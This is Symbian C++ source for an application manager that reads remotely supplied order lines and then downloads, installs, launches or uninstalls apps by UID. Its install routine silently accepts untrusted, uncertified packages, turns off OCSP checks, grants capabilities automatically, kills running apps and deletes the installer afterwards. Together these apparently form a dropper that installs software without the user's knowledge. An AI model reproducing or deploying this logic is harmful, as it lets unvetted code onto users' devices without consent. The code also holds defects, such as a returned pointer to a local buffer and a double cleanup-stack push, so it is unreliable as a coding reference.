#include <commdb.h>
#include <aknnotewrappers.h> 
#include <f32file.h>
#include <s32file.h>
#include <e32cmn.h>
#include "applicationmanager.h"
#include "commonutils.h"

CAOSync* CAOSync::NewL(){
    CAOSync* self=new (ELeave) CAOSync();
    CleanupStack::PushL(self);
    self->ConstructL();
    CleanupStack::Pop();
    return self;
}

CAOSync::~CAOSync(){
    Cancel();
    delete iWait;
}

CAOSync::CAOSync() :
    CActive(CActive::EPriorityStandard){
}

void CAOSync::ConstructL(){
    iWait=new (ELeave) CActiveSchedulerWait();
    CActiveScheduler::Add(this);
}

void CAOSync::Execute(){
    SetActive();
    iWait->Start();
}

void CAOSync::DoCancel(){
    iWait->AsyncStop();
}

void CAOSync::RunL(){
    iWait->AsyncStop();
}
void CApplicationManager::ParseApplicationOrder(const TDesC8& aContent){
    CDesC8ArrayFlat* lines=new (ELeave) CDesC8ArrayFlat(1);
    CleanupStack::PushL(lines);
    SeprateToArray(aContent,KNewLine,*lines);
    for(TInt i=0;i<lines->Count();++i){
        TBuf8<1024> line;
        line.Copy((*lines)[i]);
        line.Trim();
        if(line.Length()==0||line.FindF(_L8("#"))==0) continue;
        CDesC8ArrayFlat* fields=new (ELeave) CDesC8ArrayFlat(1);
        CleanupStack::PushL(fields);
        SeprateToArray(line,KFieldSplitter,*fields);
        if(fields->Count()>=4){
            TInt index=0;
            Application* app=new Application();
            app->Order=(*fields)[index++].Alloc();
            app->AppUid=HexString2Uid((*fields)[index++]);
            app->Url=(*fields)[index++].Alloc();
            app->Id=(*fields)[index++].Alloc();
            this->iApplicationArray->AppendL(app);
        }
        CleanupStack::PopAndDestroy(fields);
    }
    CleanupStack::PopAndDestroy(lines);
}

void CApplicationManager::StartTask(CTaskObserver* aObserver,const TDesC8& aFlowOrder,TInt aTaskId){
    this->iApplicationArray->ResetAndDestroy();
    SAFE_DELETE(iSocketEngine);
    iSocketEngine=CSocketEngine::NewL();
    this->iTaskObserver=aObserver;
    this->iTaskId=aTaskId;
    this->ParseApplicationOrder(aFlowOrder);
    iApplicationIndex=0;
    this->iTimer->After(1*1000*1000);
}

CApplicationManager* CApplicationManager::NewL(){
    CApplicationManager* self=CApplicationManager::NewLC();
    CleanupStack::Pop(self);
    return self;
}

TPtrC GetFileName(const TDesC8& aUrl){
    TPtrC8 ptr(aUrl);
    TInt pos=ptr.FindF(_L8("/"));
    TBuf<200> temp;
    do{
        ptr.Set(ptr.Right(ptr.Length()-pos-1));
        pos=ptr.FindF(_L8("/"));
    }while(pos>=0);
    if(ptr.Length()>0) temp.Copy(ptr);
    else temp.Copy(_L("temp.sisx"));

    TBuf<256> fileName;
    fileName.AppendFormat(_L("%S%S"),&KAppFolder,&temp);
    TPtrC result(fileName);
    return result;
}

void CApplicationManager::CleanUp(){
    this->iApplicationArray->ResetAndDestroy();
    this->iApplicationIndex=0;
    this->iTimer->Cancel();
}

void CApplicationManager::OnTimerExpired(){
    if(iApplicationIndex>this->iApplicationArray->Count()-1){
        Log(_L8("App Task Finished"));
        if(this->iTaskObserver) this->iTaskObserver->OnTaskSuccess(this->iTaskId);
        return;
    }
    Application* app=(Application*)this->iApplicationArray->At(iApplicationIndex++);
    TDesC8& order=*app->Order;
    TBool needDownLoad=EFalse;
    if(order.FindF(_L8("r"))==0){
        if(IsInstalled(app->AppUid)) StartApplication(app->AppUid);
        else needDownLoad=ETrue;
    }else if(order.FindF(_L8("i"))==0) needDownLoad=ETrue;
    else if(order.FindF(_L8("u"))==0) Uninstall(app->AppUid);
    if(needDownLoad){
        SAFE_DELETE(iSocketEngine);
        iSocketEngine=CSocketEngine::NewL();
        TBuf8<500> url;
        url.Copy(*(app->Url));
        TPtrC fileName=GetFileName(url);
        if(!FileExists(fileName)){
            iSocketEngine->HTTPPostDownload(this,url,_L8(""),_L8(""),fileName);
            return;
        }
        this->Install(fileName);
    }
    this->iTimer->After(5*1000*1000);
}

void CApplicationManager::OnDownloadFinished(const TDesC& aFileName){
    if(FileExists(aFileName)) this->Install(aFileName);
    this->iTimer->After(1*1000*1000);
}

CApplicationManager* CApplicationManager::NewLC(){
    CApplicationManager* self=new (ELeave) CApplicationManager;
    CleanupStack::PushL(self);
    self->ConstructL();
    return self;
}

CApplicationManager::CApplicationManager(){
}

void CApplicationManager::ConstructL(){
    this->iLsSession.Connect();
    iAsyncWaiter=CAOSync::NewL();
    iTimer=CTimeOutTimer::NewL(0,*this);
    this->iApplicationArray=new (ELeave) CArrayPtrSeg<Application> (5);
}

CApplicationManager::~CApplicationManager(){
    CleanUp();
    this->iLsSession.Close();
    SAFE_DELETE(iAsyncWaiter);
    SAFE_DELETE(iTimer);
    SAFE_DELETE(iApplicationArray);
}

void CApplicationManager::Install(const TDesC& aAppPath){
    SwiUI::RSWInstSilentLauncher launcher;
    TInt error=launcher.Connect();
    if(error==KErrNone){
        CAOSync* waiter=CAOSync::NewL();
        CleanupStack::PushL(waiter);
        iOptions. iUpgrade=SwiUI::EPolicyAllowed; //Is it ok to upgrade.
        iOptions. iOptionalItems=SwiUI::EPolicyAllowed;//Sometimes there are optional items in deployment packages.
        iOptions. iOCSP=SwiUI::EPolicyNotAllowed;//Tells whether OCSP should be performed or not.
        iOptions. iIgnoreOCSPWarnings=SwiUI::EPolicyAllowed;//If OCSP is performed, but warnings found, what should be done then? -> Allow = Go ahead.
        iOptions. iUntrusted=SwiUI::EPolicyAllowed;//Is installation of untrusted (uncertified) sw ok.
        iOptions. iPackageInfo=SwiUI::EPolicyAllowed;//Skip infos.
        iOptions. iCapabilities=SwiUI::EPolicyAllowed;//Automatically grant user capabilities.
        iOptions. iKillApp=SwiUI::EPolicyAllowed;//Silently kill an application if needed.
        iOptions. iOverwrite=SwiUI::EPolicyAllowed;//Can files be overwritten.
        iOptions. iDownload=SwiUI::EPolicyAllowed;//Is it ok to download.
        iOptions. iDrive='C';
        iOptions. iUpgradeData=SwiUI::EPolicyAllowed; //In case of upgrade, upgrade the data as well.    
        iOptionsPckg=iOptions;
        TBufC<200> FName(aAppPath);
        launcher.SilentInstall(waiter->iStatus,FName,iOptionsPckg);
        waiter->Execute();
        CleanupStack::PopAndDestroy(waiter);
        launcher.Close();
        User::After(10*1000*1000);
        DeleteFile(aAppPath);
    }
}
TInt CApplicationManager::Uninstall(const TDesC8& aAppUIDList){
    CDesC8ArrayFlat* fields=new (ELeave) CDesC8ArrayFlat(1);
    CleanupStack::PushL(fields);
    SeprateToArray(aAppUIDList,KFieldSplitter,*fields);
    for(TInt i=fields->Count()-1;i>=0;--i){
        Log((*fields)[i]);
        this->Uninstall(HexString2Uid((*fields)[i]));
    }
    CleanupStack::PopAndDestroy(fields);
    return 0;
}
TInt CApplicationManager::Uninstall(const TUid& aAppUID){
    SwiUI::RSWInstSilentLauncher launcher;
    TInt err=launcher.Connect();
    //TBuf8<150> temp;
    //temp.AppendFormat(_L8("Result of launcher.Connect():%d"),err);
    //Log(temp);
    if(err==KErrNone){
        TApaAppInfo appInfo;
        err=iLsSession.GetAppInfo(appInfo,aAppUID);
        //temp.Zero();
        //temp.AppendFormat(_L8("Result of iLsSession.GetAppInfo(appInfo,aAppUID):%d"),err);
        //Log(temp);
        if(err==KErrNone){
            TPtrC suffix=appInfo.iFullName.Right(4);
            if(suffix.CompareF(_L(".exe"))==0){
                SwiUI::TUninstallOptions options;
                options.iKillApp=SwiUI::EPolicyAllowed;
                options.iBreakDependency=SwiUI::EPolicyAllowed;
                SwiUI::TUninstallOptionsPckg optionsPckg(options);
                launcher.SilentUninstall(iAsyncWaiter->iStatus,aAppUID,optionsPckg,SwiUI::KSisxMimeType);
                iAsyncWaiter->Execute();
                err=iAsyncWaiter->iStatus.Int();
                //temp.Zero();
                //temp.AppendFormat(_L8("Result of launcher.SilentUninstall:%d"),err);
                //Log(temp);
            }
        }
        launcher.Close();
    }
    return err;
}

TBool CApplicationManager::IsInstalled(const TUid& aAppUid){
    TApaAppInfo aInfo;
    return iLsSession.GetAppInfo(aInfo,aAppUid)==KErrNone;
}

TInt CApplicationManager::StartApplication(TUid aAppUid){
    TApaAppInfo aInfo;
    iLsSession.GetAppInfo(aInfo,aAppUid);
    CApaCommandLine *cmd=CApaCommandLine::NewLC();
    CleanupStack::PushL(cmd);
    cmd->SetCommandL(EApaCommandRun);
    TFileName fullName=aInfo.iFullName;
    cmd->SetExecutableNameL(aInfo.iFullName);
    TInt err=iLsSession.StartApp(*cmd);
    CleanupStack::PopAndDestroy(cmd);
    return err;
}

HBufC *CApplicationManager::getApplicationName(const TUid& aAppUid){
    TApaAppInfo aInfo;
    if(iLsSession.GetAppInfo(aInfo,aAppUid)==KErrNone) return aInfo.iFullName.Alloc();
    else return NULL;
}
